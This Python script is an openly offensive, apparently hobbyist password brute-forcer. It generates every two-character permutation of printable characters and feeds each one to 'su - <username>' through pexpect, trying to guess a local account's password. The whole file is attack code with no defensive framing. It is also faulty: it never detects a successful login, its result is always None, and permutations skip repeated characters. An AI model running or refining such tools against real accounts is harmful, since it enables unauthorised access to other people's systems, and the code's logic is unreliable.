#!/usr/bin/env python3

import argparse
import itertools
import pexpect
import sys
import string
from pprint import pprint


def parse_user_input():

    parser = argparse.ArgumentParser()
    parser.add_argument('--username')
    args = parser.parse_args()

    returns = {}

    try:
        return args.username
    except AttributeError as e:
        sys.exit("The --username field must be specified as an argument. Please see the docstring for more information. Exiting...")


def generate_password_permutations():

    # WARNING! If you set this value too high, it could have serious implications on your machine.
    # I set it to 10, and my Chromebook started heating up very quickly.
    max_password_length = 2
    # This will create all possible permutations of length max_password_length, using all ASCII printables
    possible_passwords = list(itertools.permutations(string.printable, max_password_length))
    # Convert list of comma-separated sets into list of strings
    possible_passwords = [''.join(p) for p in possible_passwords]

    return possible_passwords


def attempt_brute_force_login(username, passwords):

    # Haven't quite figured out how to get the rc from pexpect.... Work in progress
    for p in passwords:

        child = pexpect.spawn('su - ' + username)
        child.expect('Password:')
        child.sendline(p)


def main():

    # Parse user input (if available), and if not, assign defualt value to max string length 
    username = parse_user_input()
    # Generate password combinations
    password_combinations = generate_password_permutations()
    # Attempt login
    correct_password = attempt_brute_force_login(username, password_combinations)


if __name__ == '__main__':

    main()

